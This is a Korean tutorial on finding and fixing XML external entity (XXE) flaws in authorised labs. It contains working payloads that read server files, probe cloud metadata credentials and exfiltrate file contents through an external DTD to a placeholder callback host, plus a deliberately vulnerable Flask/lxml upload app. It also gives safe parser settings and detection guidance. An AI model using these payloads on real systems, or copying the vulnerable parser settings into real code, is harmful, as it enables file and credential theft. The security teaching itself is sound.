---
title: 웹 취약점 진단 XXE편 — XML 파서에서 파일·내부망·업로드 경계까지
description: "기본 XXE 파일 읽기부터 SSRF, Blind OOB, XInclude, SVG·OOXML 업로드와 파서별 안전 설정까지 실습 중심으로 정리했습니다."
tags:
  - 웹보안
  - 취약점진단
  - XXE
  - XML
  - XInclude
  - SVG
  - OOXML
---

> [!warning] 허가된 환경에서만
> 아래 요청은 **본인이 소유하거나 명시적으로 허가받은 환경**, PortSwigger Web Security Academy, 또는 이 글의 `127.0.0.1` 전용 Docker 앱에서만 실행하세요. 예제의 파일·콜백 주소를 실제 서비스나 특정 기관으로 바꾸지 않습니다.

[[웹 취약점 진단 심화 — 실무에서 보는 기법들#1. OOXML 문서를 통한 XXE|심화 1편의 OOXML]], [[웹 취약점 진단 심화 — 실무에서 보는 기법들#2. SVG/이미지 파서를 통한 XXE 및 SSRF|SVG]], [[웹 취약점 진단 심화 — 실무에서 보는 기법들#3. Blind XXE / OOB (Out-of-Band) 데이터 유출|Blind XXE]] 절에서 개념과 단서를 소개했습니다. 이 글은 **파서가 실제로 파일·URL·DTD를 해석했다는 증거**를 남기는 PortSwigger 및 localhost 실습에 집중합니다.

## 한눈에 보는 기법 요약

| 기법 | 단서 | 성립 조건 | 영향 | 실습 |
|---|---|---|---|---|
| 기본 XXE 파일 읽기 | XML·SOAP·재고 조회 | DTD와 외부 일반 엔티티 허용, 결과 반사 | 서버 파일 읽기 | PortSwigger |
| XXE→SSRF | XML 값이 응답에 반사 | 외부 엔티티 URL fetch와 내부망 도달 | 내부 API·메타데이터 접근 | PortSwigger |
| Blind XXE OOB | XML 처리 결과가 숨겨짐 | 외부 DTD/파라미터 엔티티와 egress 허용 | 파일 OOB 유출 | PortSwigger |
| 에러 기반·로컬 DTD 재활용 | 파서 오류가 응답에 노출 | 로컬 DTD 경로·재정의 가능한 엔티티 존재 | egress 없이 파일 내용 노출 | PortSwigger |
| XInclude | 입력 일부만 XML 문서에 삽입 | 서버가 XInclude를 처리 | DOCTYPE 없이 파일 읽기 | PortSwigger |
| SVG 업로드 | 이미지 변환·아바타 | 서버가 SVG를 XML로 파싱 | 파일 읽기·SSRF | PortSwigger |
| DOCX/XLSX 업로드 | 문서 미리보기·텍스트 추출 | OOXML 내부 XML을 취약 파서로 처리 | 파일 읽기·Blind SSRF | Docker |
| 파서 기본값 차이 | 언어·버전·API 혼재 | 안전 옵션을 명시하지 않고 기본값 의존 | 배포별 재발·우회 | 안전 설정 코드 |

---

## 1. 기본 XXE — 외부 엔티티로 파일 읽기

### 원리·단서 기능·성립 조건

DTD의 외부 엔티티가 `SYSTEM "file:///..."`을 가리키고 XML 본문에서 `&xxe;`를 참조하면 파서가 파일 내용을 값으로 치환할 수 있습니다. XML을 받는다는 사실만으로 취약하지는 않습니다. **DOCTYPE 허용, 외부 엔티티 해석, 읽은 값이 응답에 흐르는 세 조건**이 모두 필요합니다.

### 따라하기 — PortSwigger 공식 랩

[Lab: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)를 엽니다. 상품의 `Check stock` 요청을 Burp Repeater로 보내 다음처럼 바꿉니다.

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

`Invalid product ID:` 뒤에 `/etc/passwd` 내용이 반환되면 성공입니다. 500 응답이나 “entity not defined”는 DTD가 처리되었다는 단서일 수 있지만 파일 읽기 성공 증거는 아닙니다.

### 진단 체크리스트와 오탐 구분

- [ ] XML의 각 데이터 노드에 엔티티 참조를 하나씩 넣어 반사 위치를 찾았다.
- [ ] 존재하는 안전한 로컬 파일과 존재하지 않는 파일의 응답을 비교했다.
- [ ] 오류 메시지가 아니라 실제 파일의 고유 내용이 반환되는지 확인했다.
- [ ] `Content-Type`을 XML로 바꿀 때만 숨은 XML 파서가 동작하는지도 확인했다.

### 조치·탐지 포인트·출처

DTD가 필요 없다면 DOCTYPE을 거부하고 외부 일반·파라미터 엔티티와 외부 DTD 로드를 모두 끕니다. 파서 오류는 사용자에게 노출하지 않습니다. 요청 본문의 `DOCTYPE`, `ENTITY`, `SYSTEM`, `file:`과 파서의 파일 열기 실패를 함께 관찰하되 문자열 일치만으로 차단 성공을 판단하지 않습니다.

- 출처: [PortSwigger — XXE](https://portswigger.net/web-security/xxe), [CWE-611](https://cwe.mitre.org/data/definitions/611.html), [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## 2. XXE에서 SSRF로 전환하기

### 원리·단서 기능·성립 조건

외부 엔티티의 system identifier가 파일 대신 HTTP URL이면 XML 파서가 서버 위치에서 URL을 가져옵니다. 값이 응답에 반사되면 내부 API 응답을 읽는 in-band SSRF이고, 반사되지 않으면 Blind SSRF입니다. 내부 URL 도달성·파서의 네트워크 허용·결과 사용이 핵심 조건입니다.

### 따라하기 — PortSwigger 공식 랩

[Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)는 모의 EC2 메타데이터를 제공합니다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

응답에 나온 경로를 한 단계씩 URL 뒤에 붙여 `/latest/meta-data/iam/security-credentials/admin`까지 탐색합니다. 최종 응답에서 랩의 `SecretAccessKey`가 보이면 성공입니다. 이 주소는 **Academy의 모의 엔드포인트에서만** 사용합니다.

### 진단 체크리스트와 오탐 구분

- [ ] DNS 조회, TCP 연결, HTTP 응답 반사 중 어디까지 성립했는지 분리했다.
- [ ] 파서가 HTTP 이외 `file`, `ftp` 등 어떤 URI scheme을 지원하는지 확인했다.
- [ ] IMDSv2처럼 PUT과 헤더가 필요한 대상은 단순 XML entity fetch로 가능한지 과장하지 않았다.

### 조치·탐지 포인트·출처

XML 계층에서 외부 엔티티를 끄고, 네트워크 계층에서도 파서 프로세스의 egress를 막습니다. 애플리케이션의 일반 HTTP 로그뿐 아니라 XML 파서/런타임의 DNS·소켓 이벤트를 작업 ID로 연결합니다. metadata·루프백·사설 대역으로 향하는 XML 처리 프로세스의 연결은 즉시 조사합니다.

- 출처: [PortSwigger — Exploiting XXE to perform SSRF](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

## 3. Blind XXE — OOB 외부 DTD와 에러 기반 로컬 DTD

### 원리·단서 기능·성립 조건

응답에 엔티티 값이 보이지 않으면 파라미터 엔티티(`%name;`)로 외부 DTD를 불러와 DNS/HTTP 콜백을 만들 수 있습니다. 데이터 유출은 외부 DTD가 로컬 파일을 읽고 그 값을 콜백 URL에 합치는 방식입니다. egress가 막혔지만 상세 파서 오류가 노출되고 재사용 가능한 로컬 DTD가 있으면, 기존 엔티티를 재정의해 파일 내용을 오류 경로에 포함할 수 있습니다.

### 따라하기 A — OOB 탐지와 외부 DTD 유출

1. [Lab: Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)에서 Collaborator 주소를 발급합니다.
2. 요청에 다음 DTD를 넣고 `productId`를 `&xxe;`로 바꿉니다.

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
]>
```

Collaborator에 DNS와 HTTP 요청이 나타나면 **탐지 성공**입니다. 파일 유출까지 확인하려면 [Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)의 exploit server에 다음 DTD를 저장합니다.

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

취약 요청에서는 외부 DTD를 호출합니다.

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER-ID.exploit-server.net/exploit">
  %xxe;
]>
```

Collaborator HTTP 요청의 `x` 값에 `/etc/hostname`이 있으면 유출 성공입니다. DNS만 있으면 취약점 탐지이지 파일 유출 성공은 아닙니다.

### 따라하기 B — 에러 기반 외부 DTD와 로컬 DTD 재활용

[Lab: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)는 외부 DTD가 존재하지 않는 파일 URL을 만들며 오류 경로에 `/etc/passwd`를 노출합니다.

외부 통신도 막힌 경우에는 [Lab: Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)를 사용합니다.

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

오류에 `/etc/passwd` 내용이 포함되면 성공입니다. 이 기법은 **해당 로컬 DTD가 실제로 존재하고 재정의할 엔티티 이름을 알아야만** 성립합니다.

### 진단 체크리스트와 오탐 구분

- [ ] Collaborator 상호작용에 고유 토큰을 사용하고 지연 요청을 기다렸다.
- [ ] DNS만, HTTP까지, 파일 내용 포함의 세 단계를 분리했다.
- [ ] 외부 DTD URL fetch와 로컬 파일 read를 각각 증명했다.
- [ ] 로컬 DTD 경로와 재정의 엔티티를 제품·OS 버전에 맞게 확인했다.

### 조치·탐지 포인트·출처

외부 파라미터 엔티티와 외부 DTD 로드도 반드시 끄고, XML 처리 워커의 egress를 제한합니다. 상세 `SAXParseException`, `FileNotFoundException`은 내부 로그에만 남기고 사용자에게는 일반 오류를 반환합니다. DTD fetch, `file:` 접근, XML 처리 직후의 DNS 요청을 한 trace로 묶습니다.

- 출처: [PortSwigger — Finding and exploiting blind XXE](https://portswigger.net/web-security/xxe/blind), [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## 4. XInclude — DOCTYPE을 제어하지 못할 때

### 원리·단서 기능·성립 조건

애플리케이션이 사용자 값을 서버 측 XML 문서에 삽입하면 공격자가 전체 문서나 DOCTYPE을 제어하지 못할 수 있습니다. 그러나 파서가 XInclude를 처리한다면 사용자 조각에 `xi:include`를 넣어 파일을 포함할 수 있습니다. 일반 텍스트 파일은 `parse="text"`가 필요합니다.

### 따라하기 — PortSwigger 공식 랩

[Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)에서 `productId` 값을 다음으로 바꿉니다.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Burp 요청에서는 XML 특수문자가 폼 인코딩되도록 Repeater의 URL-encode 기능을 사용합니다. 응답에 파일 내용이 나타나면 성공입니다.

### 진단 체크리스트와 오탐 구분

- [ ] 입력이 XML 조각으로 삽입되는 위치와 escaping 여부를 확인했다.
- [ ] XInclude 처리가 명시적으로 호출되는 파서/변환 단계를 찾았다.
- [ ] namespace가 보존되고 포함 결과가 실제 소비되는지 확인했다.

DOCTYPE 차단 메시지만 보고 안전하다고 판단하면 안 됩니다. 반대로 태그가 그대로 반사되기만 하고 include 결과가 없으면 XInclude 실행이 아닙니다.

### 조치·탐지 포인트·출처

XInclude 기능을 명시적으로 비활성화하고 사용자 입력을 XML 문자열 연결로 조립하지 않습니다. 구조화 API로 텍스트 노드를 생성합니다. `http://www.w3.org/2001/XInclude`, `xi:include`, `href=file:`과 변환기의 파일 접근을 관찰합니다.

- 출처: [PortSwigger — XInclude attacks](https://portswigger.net/web-security/xxe#xinclude-attacks), [W3C XInclude 1.0](https://www.w3.org/TR/xinclude/)

---

## 5. 파일 업로드 경유 — SVG와 DOCX/XLSX

### 원리·단서 기능·성립 조건

SVG는 XML이고 DOCX/XLSX는 XML 파일을 담은 ZIP(OOXML)입니다. 업로드 저장만으로는 XXE가 아니며, 서버가 썸네일·미리보기·텍스트 추출·대량 등록을 위해 내부 XML을 취약하게 파싱해야 합니다.

### 따라하기 A — PortSwigger SVG 랩

[Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)에서 다음 SVG를 아바타로 올립니다.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="240" height="40" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="20">&xxe;</text>
</svg>
```

서버 처리 후 표시된 이미지에 hostname이 보이면 성공입니다. 원본 SVG를 브라우저가 직접 그려 보여 준 것과 혼동하지 말고, 랩처럼 서버 측 Batik 처리를 거친 결과를 확인합니다.

### 따라하기 B — localhost DOCX/XLSX 파서

빈 폴더에 다음 파일을 저장합니다.

`docker-compose.yml`:

```yaml
services:
  app:
    build: .
    ports:
      - "127.0.0.1:5100:5100"
```

`Dockerfile`:

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim
WORKDIR /app
RUN uv pip install --system "flask==3.1.2" "lxml==6.0.2"
RUN printf 'LOCAL-OOXML-SECRET\n' > /app/lab-secret.txt
COPY app.py .
CMD ["python", "app.py"]
```

`app.py`:

```python
import io
import zipfile

from flask import Flask, jsonify, request
from lxml import etree

app = Flask(__name__)
PARTS = {".docx": "word/document.xml", ".xlsx": "xl/workbook.xml"}


@app.post("/upload")
def upload():
    uploaded = request.files["file"]
    extension = next((item for item in PARTS if uploaded.filename.endswith(item)), None)
    if extension is None:
        return jsonify(error="only .docx or .xlsx"), 400
    with zipfile.ZipFile(io.BytesIO(uploaded.read())) as archive:
        xml = archive.read(PARTS[extension])
    vulnerable = etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
    root = etree.fromstring(xml, vulnerable)
    return jsonify(text="".join(root.itertext()))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5100)
```

빌드·실행 후 최소 OOXML ZIP 두 개를 만듭니다. 이 파일은 Office에서 여는 문서가 아니라 **서버 파서 경계를 재현하는 최소 컨테이너**입니다.

```bash
docker compose up --build -d
python - <<'PY'
import zipfile

xml = b'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/lab-secret.txt">]>
<root>&xxe;</root>'''
for name, part in (("lab.docx", "word/document.xml"), ("lab.xlsx", "xl/workbook.xml")):
    with zipfile.ZipFile(name, "w") as archive:
        archive.writestr(part, xml)
PY
curl -s -F 'file=@lab.docx' http://127.0.0.1:5100/upload
curl -s -F 'file=@lab.xlsx' http://127.0.0.1:5100/upload
```

두 응답 모두 `LOCAL-OOXML-SECRET`를 반환하면 성공입니다.

> [!success] 직접 검증
> 2026-11-27에 Docker Compose로 `lxml 6.0.2` 앱을 빌드·실행하고 최소 DOCX/XLSX ZIP을 업로드해 두 경로 모두 `/app/lab-secret.txt`를 읽는 것을 확인했습니다.

### 진단 체크리스트와 오탐 구분

- [ ] MIME·확장자가 아니라 실제 서버 처리 경로와 라이브러리를 확인했다.
- [ ] SVG가 브라우저에서만 렌더링되는지 서버 변환기가 여는지 구분했다.
- [ ] DOCX/XLSX의 어느 XML part를 파싱하는지 기능별로 확인했다.
- [ ] 업로드 성공이 아니라 파일 내용·OAST 요청 등 parser side effect를 증명했다.

### 조치·탐지 포인트·출처

가능하면 안전한 고수준 문서 라이브러리를 최신으로 유지하고, 직접 XML을 열 때는 DTD·entity·XInclude·network를 명시적으로 끕니다. 변환 워커를 파일·네트워크 격리된 컨테이너에 두고 압축 해제 크기·파일 수·중첩 ZIP도 제한합니다. 업로드 작업 ID에 XML parser 오류와 파일/네트워크 접근을 연결합니다.

- 출처: [PortSwigger — XXE via file upload](https://portswigger.net/web-security/xxe#xxe-attacks-via-file-upload), [ECMA-376 Office Open XML](https://ecma-international.org/publications-and-standards/standards/ecma-376/), [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

## 6. 파서별 기본 설정 차이와 안전 설정

### 원리·단서 기능·성립 조건

“우리 언어의 최신 파서는 기본 안전”이라는 말은 API·버전·호출 방식이 바뀌면 깨집니다. 같은 Java에서도 DOM, SAX, StAX, Transformer, SchemaFactory가 별도 설정을 가지며, `XInclude`와 외부 schema/stylesheet도 다른 fetch 경로입니다. 따라서 기본값 표보다 **사용 중인 정확한 파서 인스턴스에 안전 옵션을 명시하고 회귀 테스트로 고정**하는 것이 중요합니다.

| 생태계 | 위험한 조건 | 안전 기준 |
|---|---|---|
| Java JAXP | DOCTYPE·external general/parameter entity·external DTD가 일부라도 활성 | DOCTYPE 거부, external entity/DTD 비활성, XInclude off, external DTD/schema/stylesheet 접근 차단 |
| .NET | `DtdProcessing.Parse`, 사용자 지정 `XmlResolver` | `DtdProcessing.Prohibit`, `XmlResolver = null`, 입력 크기 제한 |
| Python `lxml` | `resolve_entities=True`, `load_dtd=True`, network 허용 | `resolve_entities=False`, `load_dtd=False`, `no_network=True` |
| PHP/libxml | `LIBXML_NOENT`로 entity 치환, network 허용 | 불필요한 `NOENT` 금지, `LIBXML_NONET`, 최신 libxml, 별도 egress 차단 |

### 안전한 Java DOM 설정

```java
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

### 안전한 .NET과 Python 설정

```csharp
using System.Xml;

var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersInDocument = 1_000_000
};
using var reader = XmlReader.Create(stream, settings);
```

```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    load_dtd=False,
    no_network=True,
    huge_tree=False,
)
root = etree.fromstring(untrusted_xml, parser)
```

### 회귀 테스트와 오탐 구분

안전 설정은 코드 리뷰만으로 끝내지 말고 다음 입력이 모두 실패하거나 평문으로 남는지 자동화합니다.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/lab-secret.txt">]>
<r>&xxe;</r>
```

- [ ] 일반 엔티티, 파라미터 엔티티, 외부 DTD를 각각 테스트했다.
- [ ] XInclude, external schema, XSLT `document()` 같은 별도 fetch 기능도 확인했다.
- [ ] 업로드·SOAP·SAML·문서 변환 등 모든 파서 생성 지점에 동일 정책이 적용된다.
- [ ] 안전 설정을 지원하지 않는 파서에서는 예외를 무시하지 않고 초기화 실패로 처리한다.

DOCTYPE이 거부되었다는 한 테스트만으로 XInclude까지 막혔다고 볼 수 없습니다. 반대로 파서가 entity 선언을 문법 오류로 거부했다면 파일 읽기 취약점이 성립한 것은 아닙니다.

### 탐지 포인트·출처

파서 초기화 시 적용된 기능 플래그를 버전과 함께 기록하고, 보안 옵션 설정 실패를 배포 차단 조건으로 둡니다. 런타임에서는 XML 처리 프로세스의 unexpected file/network access와 상세 parser error 급증을 탐지합니다.

- 출처: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), [Java `XMLConstants`](https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/XMLConstants.html), [.NET `XmlReaderSettings.DtdProcessing`](https://learn.microsoft.com/en-us/dotnet/api/system.xml.xmlreadersettings.dtdprocessing), [lxml XMLParser API](https://lxml.de/api/lxml.etree.XMLParser-class.html), [PHP libxml constants](https://www.php.net/manual/en/libxml.constants.php)

---

## 다음 단계로 이어지는 공격

XXE로 얻은 것은 **서버 파일, 내부 HTTP 응답, OOB 통신 경로, 파서 오류에 노출된 환경 정보**입니다. 설정·키 파일 읽기는 세션 위조나 자격증명 탈취로, XXE→SSRF는 내부 관리 API와 메타데이터 접근으로, 업로드 파서 장악은 문서 변환 워커의 추가 취약점 탐색으로 이어집니다. 실제 후속 영향은 읽은 파일과 도달한 서비스의 권한 범위로 평가합니다.
